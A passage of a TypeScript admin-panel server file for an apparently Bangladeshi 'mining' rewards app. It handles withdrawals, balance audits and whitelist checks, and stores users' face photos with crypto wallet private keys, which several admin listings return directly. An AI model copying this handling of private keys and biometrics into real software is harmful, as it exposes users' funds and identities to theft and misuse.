      note = `${note ? note + " · " : ""}[Reject] ${feeLine} · ফেরত ${refund}৳`;
    }

    // Optional proof screenshot for a rejection — stored privately, the user
    // sees it through a short-lived signed URL.
    let proofPath: string | null = null;
    if (data.action === "rejected" && data.proofDataUrl) {
      const { bytes, contentType, ext } = dataUrlToBytes(data.proofDataUrl);
      const path = `${w.user_id}/${data.id}-${Date.now()}.${ext}`;
      const { error: upErr } = await supabaseAdmin.storage
        .from("withdraw-proof")
        .upload(path, bytes, { contentType, upsert: true });
      if (upErr) throw new Error(`Screenshot upload হয়নি: ${upErr.message}`);
      proofPath = path;
    }

    const updatePayload: any = {
      status: data.action,
      admin_note: note,
      processed_at: new Date().toISOString(),
    };
    if (data.action === "paid") updatePayload.paid_by = (data.paidBy ?? "").trim();
    if (data.action === "rejected") {
      updatePayload.reject_reason = reason || null;
      updatePayload.fee_refunded = refundFee;
      if (proofPath) updatePayload.reject_proof_path = proofPath;
    }

    const { error } = await supabaseAdmin.from("withdrawals").update(updatePayload).eq("id", data.id);
    if (error) throw new Error(error.message);

    if (data.action === "paid") {
      // Clear any still-unread "উইথড্র বাতিল" notice — otherwise the old reject
      // message keeps showing at the top even after a new payout succeeded.
      await supabaseAdmin
        .from("user_notices")
        .update({ read_at: new Date().toISOString() })
        .eq("user_id", w.user_id)
        .is("read_at", null)
        .ilike("title", "%উইথড্র রিকোয়েস্ট বাতিল%");

      await supabaseAdmin.from("user_notices").insert({
        user_id: w.user_id,
        title: "✅ উইথড্র পেমেন্ট সম্পন্ন",
        body:
          `${Math.floor(payout)}৳ আপনার ${String(w.provider).toUpperCase()} ${w.wallet_number ?? ""} নম্বরে পাঠানো হয়েছে।` +
          `\nটাকা রিকোয়েস্টের সময়েই ব্যালেন্স থেকে কাটা হয়েছিল, তাই paid হওয়ার পর ব্যালেন্স আর কমবে না।`,
      });
    }

    if (data.action === "rejected") {
      const { data: mining } = await supabaseAdmin.from("mining_state")
        .select("withdrawn_amount").eq("user_id", w.user_id).maybeSingle();
      if (mining) {
        // A reject (fee included or not) only *un-spends* money the user had
        // already earned — it never touches bonus_amount, so it is never
        // counted as "admin added balance" anywhere in the earnings history.
        await supabaseAdmin.from("mining_state")
          .update({ withdrawn_amount: Math.max(0, Number(mining.withdrawn_amount) - refund) })
          .eq("user_id", w.user_id);
      }

      // Tell the user why, right inside the app notice box.
      await supabaseAdmin.from("user_notices").insert({
        user_id: w.user_id,
        title: "❌ উইথড্র রিকোয়েস্ট বাতিল",
        body:
          `${Math.floor(payout)}৳ উইথড্র বাতিল করা হয়েছে · ${refund}৳ ব্যালেন্সে ফেরত দেওয়া হয়েছে` +
          (reason ? `\nকারণ: ${reason}` : "") +
          (proofPath ? `\n📷 স্ক্রিনশট দেওয়া হয়েছে — উইথড্র পেজের হিস্ট্রিতে দেখুন।` : ""),
      });
    }

    // Telegram ইনবক্সের কার্ডটাও আপডেট করে দিই — না হলে ওখানে pending দেখাত।
    try {
      const { markFastPayCardDone } = await import("@/lib/withdraw-fastpay.server");
      await markFastPayCardDone({
        withdrawalId: String(data.id),
        action: data.action,
        by: (data.paidBy ?? "").trim() || "Admin",
      });
    } catch {
      /* ignore */
    }

  return { ok: true, refund, fee, feeRefunded: refundFee };
  });

// Bulk mark selected pending withdrawals as paid (useful after a batch
// disbursement through bKash/Nagad merchant portal or PSP bulk payout).
const BulkPaidInput = z.object({
  ids: z.array(z.string().uuid()).min(1).max(200),
  paidBy: z.string().min(1),
});
export const adminBulkMarkPaid = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => BulkPaidInput.parse(input))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: rows } = await supabaseAdmin
      .from("withdrawals")
      .select("id, user_id, amount, provider, wallet_number, admin_note, status")
      .in("id", data.ids)
      .eq("status", "pending");

    const pending = (rows ?? []).filter((w: any) => w.status === "pending");
    if (pending.length === 0) throw new Error("কোনো pending withdraw পাওয়া যায়নি");

    const now = new Date().toISOString();
    const paidBy = data.paidBy.trim();
    let marked = 0;

    for (const w of pending) {
      const payout = Number(w.amount);
      const { error } = await supabaseAdmin
        .from("withdrawals")
        .update({ status: "paid", processed_at: now, paid_by: paidBy })
        .eq("id", w.id)
        .eq("status", "pending");
      if (error) continue;

      await supabaseAdmin
        .from("user_notices")
        .update({ read_at: now })
        .eq("user_id", w.user_id)
        .is("read_at", null)
        .ilike("title", "%উইথড্র রিকোয়েস্ট বাতিল%");

      await supabaseAdmin.from("user_notices").insert({
        user_id: w.user_id,
        title: "✅ উইথড্র পেমেন্ট সম্পন্ন",
        body:
          `${Math.floor(payout)}৳ আপনার ${String(w.provider).toUpperCase()} ${w.wallet_number ?? ""} নম্বরে পাঠানো হয়েছে।` +
          `\nটাকা রিকোয়েস্টের সময়েই ব্যালেন্স থেকে কাটা হয়েছিল, তাই paid হওয়ার পর ব্যালেন্স আর কমবে না।`,
      });

      try {
        const { markFastPayCardDone } = await import("@/lib/withdraw-fastpay.server");
        await markFastPayCardDone({ withdrawalId: String(w.id), action: "paid", by: paidBy });
      } catch {
        /* ignore */
      }
      marked++;
    }

    return { ok: true, marked, total: pending.length };
  });

// Short-lived signed URL for a rejection screenshot (admin side).
export const adminGetRejectProofUrl = createServerFn({ method: "POST" })
  .inputValidator((input: unknown) => z.object({ path: z.string().min(1) }).parse(input))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: signed } = await supabaseAdmin.storage
      .from("withdraw-proof")
      .createSignedUrl(data.path, 60 * 30);
    return { url: signed?.signedUrl ?? null };
  });


// Aggregate paid-by admin summary: each admin name with total amount paid,
// count, and per-user breakdown of every withdrawal they marked paid.
export const adminListPaidByAdmins = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const rows: any[] = [];
  for (let from = 0; ; from += 1000) {
    const { data } = await supabaseAdmin
      .from("withdrawals")
      .select("id, user_id, amount, paid_by, processed_at, wallet_number, provider, profiles:user_id(display_name, uid_seq, phone_number)")
      .eq("status", "paid")
      .not("paid_by", "is", null)
      .order("processed_at", { ascending: false })
      .order("id")
      .range(from, from + 999);
    if (!data || data.length === 0) break;
    rows.push(...data);
    if (data.length < 1000) break;
  }
  const byAdmin = new Map<string, { name: string; total: number; count: number; entries: any[] }>();
  for (const r of rows) {
    const key = String(r.paid_by || "").trim();
    if (!key) continue;
    if (!byAdmin.has(key)) byAdmin.set(key, { name: key, total: 0, count: 0, entries: [] });
    const bucket = byAdmin.get(key)!;
    bucket.total += Number(r.amount);
    bucket.count += 1;
    bucket.entries.push({
      id: r.id,
      user_id: r.user_id,
      amount: Number(r.amount),
      processed_at: r.processed_at,
      wallet_number: r.wallet_number,
      provider: r.provider,
      user_name: (r as any).profiles?.display_name ?? "User",
      uid: (r as any).profiles?.uid_seq ?? null,
      phone: (r as any).profiles?.phone_number ?? null,
    });
  }
  return Array.from(byAdmin.values()).sort((a, b) => b.total - a.total);
});

// ---------------- Faces ----------------
export const adminListFaces = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const tasks: any[] = [];
  for (let from = 0; ; from += 1000) {
    const { data, error } = await supabaseAdmin
      .from("tasks")
      .select("id, user_id, slot, status, whitelist_ok, face_photo_url, face_label, wallet_address, wallet_private_key, initial_verify_at, reverify_due_at, reverify_count, last_reverified_at, profiles:user_id(display_name, email, phone_number)")
      .not("face_photo_url", "is", null)
      .order("initial_verify_at", { ascending: false })
      .order("id")
      .range(from, from + 999);
    if (error) throw new Error(error.message);
    tasks.push(...(data ?? []));
    if (!data || data.length < 1000) break;
  }

  // Bulk-sign in chunks to avoid per-file round-trips (was timing out on 1000+ faces).
  const paths = tasks.map((t) => t.face_photo_url as string);
  const signedMap = new Map<string, string>();
  const CHUNK = 200;
  for (let i = 0; i < paths.length; i += CHUNK) {
    const slice = paths.slice(i, i + CHUNK);
    const { data: signedList } = await supabaseAdmin.storage
      .from("face-photos")
      .createSignedUrls(slice, 60 * 30);
    (signedList ?? []).forEach((s: any) => {
      if (s?.path && s?.signedUrl) signedMap.set(s.path, s.signedUrl);
    });
  }
  return tasks.map((t) => ({ ...t, signed_url: signedMap.get(t.face_photo_url) ?? null }));
});

export const adminResetTask = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ taskId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: t, error: taskError } = await supabaseAdmin
      .from("tasks")
      .select("user_id, slot, face_photo_url, wallet_address")
      .eq("id", data.taskId)
      .maybeSingle();
    if (taskError) throw new Error(taskError.message);
    if (!t) throw new Error("Slot পাওয়া যায়নি");

    // Snapshot the slot first so a mistaken reset can be undone.
    const { backupTask } = await import("@/lib/slot-backup.server");
    await backupTask(data.taskId, "admin");

    // Remove every pending backup for this slot before emptying it. Otherwise
    // the 5-minute whitelist job can promote the old face/key back into it.
    const { error: pendingError } = await supabaseAdmin
      .from("unverified_attempts")
      .delete()
      .eq("user_id", t.user_id)
      .eq("slot", t.slot);
    if (pendingError) throw new Error(pendingError.message);

    if (t.wallet_address) {
      const { error: walletPendingError } = await supabaseAdmin
        .from("unverified_attempts")
        .delete()
        .eq("user_id", t.user_id)
        .eq("wallet_address", t.wallet_address);
      if (walletPendingError) throw new Error(walletPendingError.message);
    }
    // Face photo file stays in storage so a restore brings back the exact image.

    const { error } = await supabaseAdmin.from("tasks").update({
      status: "empty",
      face_photo_url: null,
      face_label: null,
      wallet_address: null,
      wallet_private_key: null,
      initial_verify_at: null,
      reverify_due_at: null,
      done_at: null,
      whitelist_ok: true,
      last_whitelist_check_at: null,
      last_reverified_at: null,
      reverify_count: 0,
      // This lifecycle timestamp invalidates stale progress saved on the
      // user's device, so an admin reset cannot restore an old key.
      created_at: new Date().toISOString(),
    }).eq("id", data.taskId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// Reset history for one user — lets an admin undo a mistaken slot reset.
export const adminListTaskBackups = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    await gate();
    const { listTaskBackups } = await import("@/lib/slot-backup.server");
    return await listTaskBackups(data.userId);
  });

export const adminRestoreTask = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ backupId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    await gate();
    const { restoreTaskBackup } = await import("@/lib/slot-backup.server");
    const res = await restoreTaskBackup(data.backupId);
    if (!res.ok) throw new Error(res.error);
    return res;
  });


// ---------------- Unverified ----------------
export const adminListUnverified = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data, error } = await supabaseAdmin
    .from("unverified_attempts")
    .select("id, user_id, slot, kind, face_label, face_photo_url, wallet_address, wallet_private_key, reason, created_at, profiles:user_id(display_name, phone_number, email)")
    .order("created_at", { ascending: false })
    .limit(300);
  if (error) throw new Error(error.message);

  // Creating many signed URLs in parallel often trips Supabase rate-limits or
  // Worker timeouts, which surfaces as a generic "Failed to fetch". Batch them.
  const rows = (data ?? []) as any[];
  const CHUNK = 10;
  const signedMap = new Map<string, string | null>();
  for (let i = 0; i < rows.length; i += CHUNK) {
    const chunk = rows.slice(i, i + CHUNK);
    await Promise.all(
      chunk.map(async (r) => {
        if (!r.face_photo_url) {
          signedMap.set(r.id, null);
          return;
        }
        try {
          const { data: s } = await supabaseAdmin.storage
            .from("face-photos")
            .createSignedUrl(r.face_photo_url, 60 * 30);
          signedMap.set(r.id, s?.signedUrl ?? null);
        } catch {
          signedMap.set(r.id, null);
        }
      }),
    );
  }

  return rows.map((r) => ({ ...r, signed_url: signedMap.get(r.id) ?? null }));
});

export const adminমুছুনUnverified = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ id: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: r } = await supabaseAdmin.from("unverified_attempts").select("face_photo_url").eq("id", data.id).maybeSingle();
    if (r?.face_photo_url) {
      await supabaseAdmin.storage.from("face-photos").remove([r.face_photo_url]);
    }
    await supabaseAdmin.from("unverified_attempts").delete().eq("id", data.id);
    return { ok: true };
  });

// Promote a not-whitelisted attempt into a real verified slot for the user.
// - Copies photo + wallet + key + label into the chosen slot (or first empty slot).
// - Marks status='verified', reverify_due_at=3 days later just like normal first verify.
// - Removes the unverified_attempts row (photo stays, moved semantically).
export const adminPromoteUnverified = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    id: z.string().uuid(),
    slot: z.number().int().min(1).max(1000).optional(),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: att } = await supabaseAdmin
      .from("unverified_attempts").select("*").eq("id", data.id).maybeSingle();
    if (!att) throw new Error("Attempt পাওয়া যায়নি");
    if (!att.wallet_address || !att.wallet_private_key || !att.face_photo_url) {
      throw new Error("Attempt-এ photo/key/wallet সম্পূর্ণ নেই");
    }

    // Reject if this wallet is already bound to any task
    const { data: dup } = await supabaseAdmin
      .from("tasks").select("id, user_id, slot").eq("wallet_address", att.wallet_address).maybeSingle();
    if (dup) throw new Error(`এই wallet ইতিমধ্যে slot #${dup.slot}-এ bind আছে`);

    // Pick slot: requested slot (must be empty & owned by user) else first empty
    const { data: userTasks } = await supabaseAdmin
      .from("tasks").select("id, slot, status").eq("user_id", att.user_id).order("slot");
    let target = (userTasks ?? []).find((t) =>
      data.slot ? t.slot === data.slot : t.status === "empty"
    );
    if (data.slot && target && target.status !== "empty") {
      throw new Error(`Slot #${data.slot} খালি নেই`);
    }
    if (!target) throw new Error("খালি slot নেই — user-এর সব slot পূর্ণ");

    const nowDate = new Date();
    const now = nowDate.toISOString();
    const dueAt = new Date(nowDate.getTime() + REVERIFY_INTERVAL_MS).toISOString();
    const { error } = await supabaseAdmin.from("tasks").update({
      face_photo_url: att.face_photo_url,
      face_label: att.face_label,
      wallet_address: att.wallet_address,
      wallet_private_key: att.wallet_private_key,
      status: "verified",
      initial_verify_at: now,
      reverify_due_at: dueAt,
      whitelist_ok: true,
      last_whitelist_check_at: now,
    }).eq("id", target.id);
    if (error) throw new Error(error.message);

    // মুছুন the attempt row but keep the photo (task now owns it)
    await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id);
    return { ok: true, slot: target.slot };
  });

// ---------------- Mining adjust ----------------
const AdjustInput = z.object({
  userId: z.string().uuid(),
  delta: z.number().refine((v) => v !== 0, "0 দেওয়া যাবে না").refine((v) => Math.abs(v) <= 100000, "সর্বোচ্চ ১,০০,০০০৳"),
  note: z.string().optional(),
});

export const adminAdjustBalance = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => AdjustInput.parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    // যোগ করা আবার চালু — তবে টাকা যোগ করলে অবশ্যই কারণ লিখতে হবে, এবং
    // প্রতিটি পরিবর্তন balance_audit-এ (before/after সহ) লেখা থাকে যাতে
    // ভবিষ্যতে "টাকা কোথা থেকে এলো / কোথায় গেলো" সবসময় প্রমাণসহ দেখা যায়।
    const note = (data.note ?? "").trim();
    if (data.delta > 0 && note.length < 3) {
      throw new Error("ব্যালেন্স যোগ করতে কারণ (note) লিখতে হবে");
    }
    const { data: m } = await supabaseAdmin.from("mining_state").select("*").eq("user_id", data.userId).maybeSingle();
    if (!m) throw new Error("No mining state");
    const prevAccrued = Number(m.accrued_amount ?? 0);
    const prevBonus = Number((m as any).bonus_amount ?? 0);
    const withdrawn = Number((m as any).withdrawn_amount ?? 0);
    const newAccrued = Math.max(0, prevAccrued + data.delta);
    const newBonus = Math.max(0, prevBonus + data.delta);
    const { error } = await supabaseAdmin.from("mining_state")
      .update({ accrued_amount: newAccrued, bonus_amount: newBonus })
      .eq("user_id", data.userId);
    if (error) throw new Error(error.message);
    // Log the admin credit/debit so it shows in Admin Payout history
    await supabaseAdmin.from("admin_credits").insert({
      user_id: data.userId,
      amount: data.delta,
      note: note || null,
    });
    await (supabaseAdmin as any).from("balance_audit").insert({
      user_id: data.userId,
      actor: "admin_panel",
      source: data.delta > 0 ? "admin_add" : "admin_sub",
      note: note || null,
      accrued_before: prevAccrued, accrued_after: newAccrued,
      bonus_before: prevBonus, bonus_after: newBonus,
      withdrawn_before: withdrawn, withdrawn_after: withdrawn,
      balance_before: prevAccrued - withdrawn,
      balance_after: newAccrued - withdrawn,
      delta: newAccrued - prevAccrued,
    });
    return { ok: true, new_balance: newAccrued };
  });

/** এক ইউজারের balance পরিবর্তনের পূর্ণ history (কে/কী কারণে, আগে কত ছিল, পরে কত) */
export const adminBalanceAudit = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: rows, error } = await (supabaseAdmin as any)
      .from("balance_audit")
      .select("id, actor, source, note, balance_before, balance_after, delta, accrued_before, accrued_after, withdrawn_before, withdrawn_after, created_at")
      .eq("user_id", data.userId)
      .order("created_at", { ascending: false })
      .limit(200);
    if (error) throw new Error(error.message);
    return (rows ?? []) as any[];
  });


export const adminListCredits = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data, error } = await supabaseAdmin
    .from("admin_credits")
    .select("id, user_id, amount, note, created_at, profiles:user_id(display_name, phone_number, uid_seq)")
    .order("created_at", { ascending: false })
    .limit(2000);
  if (error) throw new Error(error.message);
  return data ?? [];
});

// Admin manual override — sets admin_forced_active so settle_mining stops
// flipping the switch back based on whitelist/re-verify state.
export const adminToggleMining = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid(), active: z.boolean() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const patch: any = {
      is_active: data.active,
      admin_forced_active: data.active,
    };
    if (data.active) {
      patch.activated_at = new Date().toISOString();
      patch.last_credited_at = new Date().toISOString();
    }
    const { error } = await supabaseAdmin.from("mining_state").update(patch).eq("user_id", data.userId);
    if (error) throw new Error(error.message);
    if (data.active) {
      await supabaseAdmin.rpc("settle_mining", { _user_id: data.userId });
    }
    return { ok: true };
  });

// Clear admin override — settle_mining resumes auto rules (10/10 + no whitelist loss).
export const adminClearMiningOverride = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin
      .from("mining_state")
      .update({ admin_forced_active: false } as any)
      .eq("user_id", data.userId);
    if (error) throw new Error(error.message);
    await supabaseAdmin.rpc("settle_mining", { _user_id: data.userId });
    return { ok: true };
  });

// Re-check whitelist for a single unverified attempt. If it's now
// whitelisted → promote it into the user's next empty slot automatically.
export const adminRecheckAttempt = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ id: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { isWhitelistedRPC } = await import("@/lib/celo-whitelist");
    const { data: att } = await supabaseAdmin
      .from("unverified_attempts").select("*").eq("id", data.id).maybeSingle();
    if (!att) throw new Error("Attempt নেই");
    if (!att.wallet_address) throw new Error("Wallet নেই");

    const ok = await isWhitelistedRPC(att.wallet_address);
    if (!ok) return { ok: true, whitelisted: false };

    // Wallet already bound elsewhere?
    const { data: dup } = await supabaseAdmin
      .from("tasks").select("id, slot").eq("wallet_address", att.wallet_address).maybeSingle();
    if (dup) {
      await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id);
      return { ok: true, whitelisted: true, alreadyBound: true, slot: dup.slot };
    }

    const { data: userTasks } = await supabaseAdmin
      .from("tasks").select("id, slot, status").eq("user_id", att.user_id).order("slot");
    const target = (userTasks ?? []).find((t) => t.status === "empty");
    if (!target) throw new Error("খালি slot নেই");

    const nowDate = new Date();
    const now = nowDate.toISOString();
    const dueAt = new Date(nowDate.getTime() + REVERIFY_INTERVAL_MS).toISOString();
    const { error } = await supabaseAdmin.from("tasks").update({
      face_photo_url: att.face_photo_url,
      face_label: att.face_label,
      wallet_address: att.wallet_address,
      wallet_private_key: att.wallet_private_key,
      status: "verified",
      initial_verify_at: now,
      reverify_due_at: dueAt,
      whitelist_ok: true,
      last_whitelist_check_at: now,
    }).eq("id", target.id);
    if (error) throw new Error(error.message);
    await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id);
    return { ok: true, whitelisted: true, slot: target.slot };
  });

// Bulk re-check every not-whitelisted attempt; auto-promote the ones that pass.
// Paginated — client loops with offset until remaining === 0.
export const adminRecheckAllAttempts = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => {
    const v = (i ?? {}) as { offset?: number; limit?: number };
    return { offset: Math.max(0, v.offset ?? 0), limit: Math.min(40, Math.max(1, v.limit ?? 25)) };
  })
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { isWhitelistedRPC } = await import("@/lib/celo-whitelist");

    const { count: total } = await supabaseAdmin
      .from("unverified_attempts").select("id", { count: "exact", head: true })
      .not("wallet_address", "is", null);

    const { data: attempts } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id, user_id, wallet_address, face_photo_url, face_label, wallet_private_key")
      .not("wallet_address", "is", null)
      .order("id")
      .range(data.offset, data.offset + data.limit - 1);

    const list = attempts ?? [];
    let checked = 0, promoted = 0, still = 0, skipped = 0;
    const usersToSettle = new Set<string>();
    const CONCURRENCY = 150;

    for (let i = 0; i < list.length; i += CONCURRENCY) {
      const chunk = list.slice(i, i + CONCURRENCY);
      const okFlags = await Promise.all(
        chunk.map((a) => isWhitelistedRPC(a.wallet_address as string).catch(() => false)),
      );
      checked += chunk.length;

      for (let j = 0; j < chunk.length; j++) {
        const att = chunk[j];
        if (!okFlags[j]) { still++; continue; }

        const { data: dup } = await supabaseAdmin
          .from("tasks").select("id").eq("wallet_address", att.wallet_address).maybeSingle();
        if (dup) { await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id); skipped++; continue; }

        const { data: userTasks } = await supabaseAdmin
          .from("tasks").select("id, slot, status").eq("user_id", att.user_id).order("slot");
        const target = (userTasks ?? []).find((t) => t.status === "empty");
        if (!target) { skipped++; continue; }

        const nowDate = new Date();
        const now = nowDate.toISOString();
        const dueAt = new Date(nowDate.getTime() + REVERIFY_INTERVAL_MS).toISOString();
        await supabaseAdmin.from("tasks").update({
          face_photo_url: att.face_photo_url,
          face_label: att.face_label,
          wallet_address: att.wallet_address,
          wallet_private_key: att.wallet_private_key,
          status: "verified",
          initial_verify_at: now,
          reverify_due_at: dueAt,
          whitelist_ok: true,
          last_whitelist_check_at: now,
        }).eq("id", target.id);
        await supabaseAdmin.from("unverified_attempts").delete().eq("id", att.id);
        usersToSettle.add(att.user_id);
        promoted++;
      }
    }

    await Promise.all(
      Array.from(usersToSettle).map((uid) => supabaseAdmin.rpc("settle_mining", { _user_id: uid })),
    );

    // Rows may have been deleted (promoted/skipped-dup); so next offset advances only
    // by what remained. Simpler: recompute total for remaining calculation.
    const { count: totalAfter } = await supabaseAdmin
      .from("unverified_attempts").select("id", { count: "exact", head: true })
      .not("wallet_address", "is", null);
    const remaining = totalAfter ?? 0;
    // Advance offset past the "still" ones we didn't touch, otherwise we'd re-check the same rows.
    const nextOffset = data.offset + still;
    return {
      ok: true, checked, promoted, still, skipped,
      total: total ?? 0,
      remaining,
      offset: nextOffset,
      done: list.length === 0 || nextOffset >= remaining,
    };
  });


// ---------------- Re-verify queue ----------------
export const adminReverifyQueue = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data, error } = await supabaseAdmin
    .from("tasks")
    .select("id, user_id, slot, face_label, face_photo_url, reverify_due_at, profiles:user_id(display_name, phone_number, email)")
    .eq("status", "verified")
    .order("reverify_due_at", { ascending: true })
    .limit(300);
  if (error) throw new Error(error.message);

  const rows = (data ?? []) as any[];
  const CHUNK = 10;
  const signedMap = new Map<string, string | null>();
  for (let i = 0; i < rows.length; i += CHUNK) {
    const chunk = rows.slice(i, i + CHUNK);
    await Promise.all(
      chunk.map(async (t) => {
        if (!t.face_photo_url) {
          signedMap.set(t.id, null);
          return;
        }
        try {
          const { data: s } = await supabaseAdmin.storage
            .from("face-photos")
            .createSignedUrl(t.face_photo_url, 60 * 30);
          signedMap.set(t.id, s?.signedUrl ?? null);
        } catch {
          signedMap.set(t.id, null);
        }
      }),
    );
  }

  return rows.map((t) => ({ ...t, signed_url: signedMap.get(t.id) ?? null }));
});

// ---------------- Wallets ----------------
export const adminListWallets = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const { data } = await supabaseAdmin
    .from("wallets")
    .select("*, profiles:user_id(display_name, phone_number, email)")
    .order("created_at", { ascending: false });
  return data ?? [];
});

// ---------------- মুছুন user ----------------
export const adminমুছুনUser = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    // collect photos
    const { data: tasks } = await supabaseAdmin.from("tasks").select("face_photo_url").eq("user_id", data.userId);
    const { data: unv } = await supabaseAdmin.from("unverified_attempts").select("face_photo_url").eq("user_id", data.userId);
    const paths = [
      ...(tasks ?? []).map((t: any) => t.face_photo_url).filter(Boolean),
      ...(unv ?? []).map((u: any) => u.face_photo_url).filter(Boolean),
    ];
    if (paths.length) await supabaseAdmin.storage.from("face-photos").remove(paths);
    // delete auth user (cascades profile + related rows via FK on delete cascade)
    const { error } = await supabaseAdmin.auth.admin.deleteUser(data.userId);
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// ---------------- Reset user password ----------------
export const adminResetUserPassword = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    userId: z.string().uuid(),
    newPassword: z.string().min(6).max(72),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { error } = await supabaseAdmin.auth.admin.updateUserById(data.userId, {
      password: data.newPassword,
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// ---------------- Manual whitelist re-check (admin) ----------------
// Paginated: client loops with offset until remaining === 0.
// Each call handles at most BATCH tasks so we stay well under the
// Worker time limit ("Failed to fetch" was the 30s cutoff on big sets).
export const adminRunWhitelistCheck = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => {
    const v = (i ?? {}) as { offset?: number; limit?: number };
    return { offset: Math.max(0, v.offset ?? 0), limit: Math.min(60, Math.max(1, v.limit ?? 40)) };
  })
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { isWhitelistedRPC } = await import("@/lib/celo-whitelist");

    const { count: total } = await supabaseAdmin
      .from("tasks")
      .select("id", { count: "exact", head: true })
      .in("status", ["verified", "done"])
      .not("wallet_address", "is", null);

    const { data: tasks } = await supabaseAdmin
      .from("tasks")
      .select("id, user_id, wallet_address, status, whitelist_ok, reverify_count")
      .in("status", ["verified", "done"])
      .not("wallet_address", "is", null)
      .order("id")
      .range(data.offset, data.offset + data.limit - 1);

    const list = tasks ?? [];
    let checked = 0, flipped = 0, restored = 0, autoReverified = 0;
    const affected = new Set<string>();
    const CONCURRENCY = 150;

    for (let i = 0; i < list.length; i += CONCURRENCY) {
      const chunk = list.slice(i, i + CONCURRENCY);
      const okFlags = await Promise.all(
        chunk.map((t) => isWhitelistedRPC(t.wallet_address as string).catch(() => null)),
      );
      checked += chunk.length;

      await Promise.all(chunk.map(async (t, j) => {
        const ok = okFlags[j];
        if (ok === null) return;
        const { data: transition, error: transitionError } = await supabaseAdmin
          .rpc("transition_task_whitelist", { _task_id: t.id, _is_whitelisted: ok });
        if (transitionError) return;
        if (transition === "lost") {
          affected.add(t.user_id); flipped++;
        } else if (transition === "restored") {
          affected.add(t.user_id); restored++; autoReverified++;
        }
      }));
    }

    await Promise.all(
      Array.from(affected).map((uid) => supabaseAdmin.rpc("settle_mining", { _user_id: uid })),
    );

    const nextOffset = data.offset + list.length;
    const totalCount = total ?? 0;
    const remaining = Math.max(0, totalCount - nextOffset);
    return {
      ok: true, checked, flipped, restored, autoReverified,
      affected: affected.size,
      offset: nextOffset,
      total: totalCount,
      remaining,
      done: list.length === 0 || remaining === 0,
    };
  });

// ---------------- Bonus Vouchers ----------------
export const adminCreateVoucher = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({
    userId: z.string().uuid(),
    amount: z.number().positive().max(100000),
    reason: z.string().trim().min(3).max(500),
  }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: row, error } = await supabaseAdmin.from("bonus_vouchers").insert({
      user_id: data.userId,
      amount: data.amount,
      reason: data.reason,
      status: "pending",
    } as any).select("id").maybeSingle();
    if (error) throw new Error(error.message);
    await (supabaseAdmin as any).from("balance_audit").insert({
      user_id: data.userId,
      actor: "admin_panel",
      source: "admin_voucher",
      note: `ভাউচার তৈরি: ${data.amount}৳ — ${data.reason}`,
      delta: 0,
    });
    return { ok: true, id: row?.id ?? null };
  });


export const adminListVouchersForUser = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) => z.object({ userId: z.string().uuid() }).parse(i))
  .handler(async ({ data }) => {
    const supabaseAdmin = await gate();
    const { data: rows } = await supabaseAdmin
      .from("bonus_vouchers")
      .select("*")
      .eq("user_id", data.userId)
      .order("created_at", { ascending: false });
    return rows ?? [];
  });

// ---------------- Referrer Leaderboard ----------------
// Kun user koto jon k reffer korse ar tader theke koita face verification asteche.
export const adminReferrerLeaderboard = createServerFn({ method: "GET" }).handler(async () => {
  const supabaseAdmin = await gate();
  const fetchAll = async (table: "profiles" | "tasks", select: string) => {
    const rows: any[] = [];
    for (let from = 0; ; from += 1000) {
